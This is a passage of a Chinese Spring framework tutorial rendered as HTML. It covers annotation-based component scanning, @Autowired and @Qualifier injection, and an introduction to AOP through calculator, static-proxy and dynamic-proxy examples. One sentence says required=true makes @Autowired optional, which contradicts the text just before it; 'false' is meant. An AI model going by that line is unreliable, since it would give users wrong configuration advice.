<span class="title class_">UserService</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建业务层组件UserServiceImpl</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建接口UserDao</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserDao</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建持久层组件UserDaoImpl</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDaoImpl</span> <span class="keyword">implements</span> <span class="title class_">UserDao</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="⑦扫描组件"><a href="#⑦扫描组件" class="headerlink" title="⑦扫描组件"></a>⑦扫描组件</h4><p>情况一：最基本的扫描方式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.atguigu&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br></pre></td></tr></table></figure><p>情况二：指定要排除的组件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.atguigu&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- context:exclude-filter标签：指定排除规则 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        type：设置排除或包含的依据</span></span><br><span class="line"><span class="comment">        type=&quot;annotation&quot;，根据注解排除，expression中设置要排除的注解的全类名</span></span><br><span class="line"><span class="comment">        type=&quot;assignable&quot;，根据类型排除，expression中设置要排除的类型的全类名</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:exclude-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span><span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Controller&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;context:exclude-filter type=&quot;assignable&quot;expression=&quot;com.atguigu.controller.UserController&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br></pre></td></tr></table></figure><p>情况三：仅扫描指定组件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.atguigu&quot;</span> <span class="attr">use-default-filters</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- context:include-filter标签：指定在原有扫描规则的基础上追加的规则 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- use-default-filters属性：取值false表示关闭默认扫描规则 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 此时必须设置use-default-filters=&quot;false&quot;，因为默认规则即扫描指定包下所有类 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        type：设置排除或包含的依据</span></span><br><span class="line"><span class="comment">        type=&quot;annotation&quot;，根据注解排除，expression中设置要排除的注解的全类名</span></span><br><span class="line"><span class="comment">        type=&quot;assignable&quot;，根据类型排除，expression中设置要排除的类型的全类名</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span><span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Controller&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;context:include-filter type=&quot;assignable&quot;expression=&quot;com.atguigu.controller.UserController&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="⑧测试"><a href="#⑧测试" class="headerlink" title="⑧测试"></a>⑧测试</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testAutowireByAnnotation</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">ac</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">        <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">    <span class="type">UserController</span> <span class="variable">userController</span> <span class="operator">=</span> ac.getBean(UserController.class);</span><br><span class="line">    System.out.println(userController);</span><br><span class="line">    <span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> ac.getBean(UserService.class);</span><br><span class="line">    System.out.println(userService);</span><br><span class="line">    <span class="type">UserDao</span> <span class="variable">userDao</span> <span class="operator">=</span> ac.getBean(UserDao.class);</span><br><span class="line">    System.out.println(userDao);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="⑨组件所对应的bean的id"><a href="#⑨组件所对应的bean的id" class="headerlink" title="⑨组件所对应的bean的id"></a>⑨组件所对应的bean的id</h4><p>在我们使用XML方式管理bean的时候，每个bean都有一个唯一标识，便于在其他地方引用。现在使用</p><p>注解后，每个组件仍然应该有一个唯一标识。</p><blockquote><p>默认情况</p><p>类名首字母小写就是bean的id。例如：UserController类对应的bean的id就是userController。</p><p>自定义bean的id</p><p>可通过标识组件的注解的value属性设置自定义的bean的id</p><p>@Service(“userService”)&#x2F;&#x2F;默认为userServiceImpl public class UserServiceImpl implements</p><p>UserService {}</p></blockquote><h3 id="2-3-2、实验二：基于注解的自动装配"><a href="#2-3-2、实验二：基于注解的自动装配" class="headerlink" title="2.3.2、实验二：基于注解的自动装配"></a>2.3.2、实验二：基于注解的自动装配</h3><h4 id="①场景模拟-1"><a href="#①场景模拟-1" class="headerlink" title="①场景模拟"></a>①场景模拟</h4><blockquote><p>参考基于xml的自动装配</p><p>在UserController中声明UserService对象</p><p>在UserServiceImpl中声明UserDao对象</p></blockquote><h4 id="②-Autowired注解"><a href="#②-Autowired注解" class="headerlink" title="②@Autowired注解"></a>②@Autowired注解</h4><p>在成员变量上直接标记@Autowired注解即可完成自动装配，不需要提供setXxx()方法。以后我们在项</p><p>目中的正式用法就是这样。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveUser</span><span class="params">()</span>&#123;</span><br><span class="line">        userService.saveUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">saveUser</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserDao userDao;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveUser</span><span class="params">()</span> &#123;</span><br><span class="line">        userDao.saveUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserDao</span> &#123;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">saveUser</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDaoImpl</span> <span class="keyword">implements</span> <span class="title class_">UserDao</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveUser</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;保存成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="③-Autowired注解其他细节"><a href="#③-Autowired注解其他细节" class="headerlink" title="③@Autowired注解其他细节"></a>③@Autowired注解其他细节</h4><blockquote><p>@Autowired注解可以标记在构造器和set方法上</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserController</span><span class="params">(UserService userService)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.userService = userService;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveUser</span><span class="params">()</span>&#123;</span><br><span class="line">        userService.saveUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUserService</span><span class="params">(UserService userService)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.userService = userService;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveUser</span><span class="params">()</span>&#123;</span><br><span class="line">        userService.saveUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="④-Autowired工作流程"><a href="#④-Autowired工作流程" class="headerlink" title="④@Autowired工作流程"></a>④@Autowired工作流程</h4><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/14.png"></p><ul><li>首先根据所需要的组件类型到IOC容器中查找<ul><li>能够找到唯一的bean：直接执行装配</li><li>如果完全找不到匹配这个类型的bean：装配失败</li><li>和所需类型匹配的bean不止一个<ul><li>没有@Qualifier注解：根据@Autowired标记位置成员变量的变量名作为bean的id进行匹配</li><li>能够找到：执行装配</li><li>找不到：装配失败</li><li>使用@Qualifier注解：根据@Qualifier注解中指定的名称作为bean的id进行匹配</li><li>能够找到：执行装配</li><li>找不到：装配失败</li></ul></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="meta">@Qualifier(&quot;userServiceImpl&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveUser</span><span class="params">()</span>&#123;</span><br><span class="line">        userService.saveUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>@Autowired中有属性required，默认值为true，因此在自动装配无法找到相应的bean时，会装</p><p>配失败</p><p>可以将属性required的值设置为true，则表示能装就装，装不上就不装，此时自动装配的属性为</p><p>默认值</p><p>但是实际开发时，基本上所有需要装配组件的地方都是必须装配的，用不上这个属性。</p></blockquote><h1 id="3、AOP"><a href="#3、AOP" class="headerlink" title="3、AOP"></a>3、AOP</h1><h2 id="3-1、场景模拟"><a href="#3-1、场景模拟" class="headerlink" title="3.1、场景模拟"></a>3.1、场景模拟</h2><h3 id="3-1-1、声明接口"><a href="#3-1-1、声明接口" class="headerlink" title="3.1.1、声明接口"></a>3.1.1、声明接口</h3><p>声明计算器接口Calculator，包含加减乘除的抽象方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">mul</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">div</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-1-2、创建实现类"><a href="#3-1-2、创建实现类" class="headerlink" title="3.1.2、创建实现类"></a>3.1.2、创建实现类</h3><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/15.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CalculatorPureImpl</span> <span class="keyword">implements</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> i + j;</span><br><span class="line">        System.out.println(<span class="string">&quot;方法内部 result = &quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> i - j;</span><br><span class="line">        System.out.println(<span class="string">&quot;方法内部 result = &quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">mul</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> i * j;</span><br><span class="line">        System.out.println(<span class="string">&quot;方法内部 result = &quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">div</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> i / j;</span><br><span class="line">        System.out.println(<span class="string">&quot;方法内部 result = &quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-1-3、创建带日志功能的实现类"><a href="#3-1-3、创建带日志功能的实现类" class="headerlink" title="3.1.3、创建带日志功能的实现类"></a>3.1.3、创建带日志功能的实现类</h3><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/16.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CalculatorLogImpl</span> <span class="keyword">implements</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[日志] add 方法开始了，参数是：&quot;</span> + i + <span class="string">&quot;,&quot;</span> + j);</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> i + j;</span><br><span class="line">        System.out.println(<span class="string">&quot;方法内部 result = &quot;</span> + result);</span><br><span class="line">        System.out.println(<span class="string">&quot;[日志] add 方法结束了，结果是：&quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[日志] sub 方法开始了，参数是：&quot;</span> + i + <span class="string">&quot;,&quot;</span> + j);</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> i - j;</span><br><span class="line">        System.out.println(<span class="string">&quot;方法内部 result = &quot;</span> + result);</span><br><span class="line">        System.out.println(<span class="string">&quot;[日志] sub 方法结束了，结果是：&quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">mul</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[日志] mul 方法开始了，参数是：&quot;</span> + i + <span class="string">&quot;,&quot;</span> + j);</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> i * j;</span><br><span class="line">        System.out.println(<span class="string">&quot;方法内部 result = &quot;</span> + result);</span><br><span class="line">        System.out.println(<span class="string">&quot;[日志] mul 方法结束了，结果是：&quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">div</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[日志] div 方法开始了，参数是：&quot;</span> + i + <span class="string">&quot;,&quot;</span> + j);</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> i / j;</span><br><span class="line">        System.out.println(<span class="string">&quot;方法内部 result = &quot;</span> + result);</span><br><span class="line">        System.out.println(<span class="string">&quot;[日志] div 方法结束了，结果是：&quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-1-4、提出问题"><a href="#3-1-4、提出问题" class="headerlink" title="3.1.4、提出问题"></a>3.1.4、提出问题</h3><h4 id="①现有代码缺陷"><a href="#①现有代码缺陷" class="headerlink" title="①现有代码缺陷"></a>①现有代码缺陷</h4><p>针对带日志功能的实现类，我们发现有如下缺陷：</p><ul><li>对核心业务功能有干扰，导致程序员在开发核心业务功能时分散了精力</li><li>附加功能分散在各个业务功能方法中，不利于统一维护</li></ul><h4 id="②解决思路"><a href="#②解决思路" class="headerlink" title="②解决思路"></a>②解决思路</h4><p>解决这两个问题，核心就是：解耦。我们需要把附加功能从业务功能代码中抽取出来。</p><h4 id="③困难"><a href="#③困难" class="headerlink" title="③困难"></a>③困难</h4><p>解决问题的困难：要抽取的代码在方法内部，靠以前把子类中的重复代码抽取到父类的方式没法解决。所以需要引入新的技术。</p><h2 id="3-2、代理模式"><a href="#3-2、代理模式" class="headerlink" title="3.2、代理模式"></a>3.2、代理模式</h2><h3 id="3-2-1、概念"><a href="#3-2-1、概念" class="headerlink" title="3.2.1、概念"></a>3.2.1、概念</h3><h4 id="①介绍"><a href="#①介绍" class="headerlink" title="①介绍"></a>①介绍</h4><p>二十三种设计模式中的一种，属于结构型模式。它的作用就是通过提供一个代理类，让我们在调用目标方法的时候，不再是直接对目标方法进行调用，而是通过代理类<strong>间接</strong>调用。让不属于目标方法核心逻辑的代码从目标方法中剥离出来——<strong>解耦</strong>。调用目标方法时先调用代理对象的方法，减少对目标方法的调用和打扰，同时让附加功能能够集中在一起也有利于统一维护。</p><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/17.png"></p><p>使用代理后：</p><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/18.png"></p><h4 id="②生活中的代理"><a href="#②生活中的代理" class="headerlink" title="②生活中的代理"></a>②生活中的代理</h4><ul><li>广告商找大明星拍广告需要经过经纪人</li><li>合作伙伴找大老板谈合作要约见面时间需要经过秘书</li><li>房产中介是买卖双方的代理</li></ul><h4 id="③相关术语"><a href="#③相关术语" class="headerlink" title="③相关术语"></a>③相关术语</h4><ul><li>代理：将非核心逻辑剥离出来以后，封装这些非核心逻辑的类、对象、方法。</li><li>目标：被代理“套用”了非核心逻辑代码的类、对象、方法。</li></ul><h3 id="3-2-2、静态代理"><a href="#3-2-2、静态代理" class="headerlink" title="3.2.2、静态代理"></a>3.2.2、静态代理</h3><p>创建静态代理类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CalculatorStaticProxy</span> <span class="keyword">implements</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="comment">// 将被代理的目标对象声明为成员变量</span></span><br><span class="line">    <span class="keyword">private</span> Calculator target;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CalculatorStaticProxy</span><span class="params">(Calculator target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="comment">// 附加功能由代理类中的代理方法来实现</span></span><br><span class="line">        System.out.println(<span class="string">&quot;[日志] add 方法开始了，参数是：&quot;</span> + i + <span class="string">&quot;,&quot;</span> + j);</span><br><span class="line">        <span class="comment">// 通过目标对象来实现核心业务逻辑</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">addResult</span> <span class="operator">=</span> target.add(i, j);</span><br><span class="line">        System.out.println(<span class="string">&quot;[日志] add 方法结束了，结果是：&quot;</span> + addResult);</span><br><span class="line">        <span class="keyword">return</span> addResult;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>静态代理确实实现了解耦，但是由于代码都写死了，完全不具备任何的灵活性。就拿日志功能来</p><p>说，将来其他地方也需要附加日志，那还得再声明更多个静态代理类，那就产生了大量重复的代</p><p>码，日志功能还是分散的，没有统一管理。</p><p>提出进一步的需求：将日志功能集中到一个代理类中，将来有任何日志需求，都通过这一个代理</p><p>类来实现。这就需要使用动态代理技术了。</p></blockquote><h3 id="3-2-3、动态代理"><a href="#3-2-3、动态代理" class="headerlink" title="3.2.3、动态代理"></a>3.2.3、动态代理</h3><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/19.png"></p><p>生产代理对象的工厂类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td 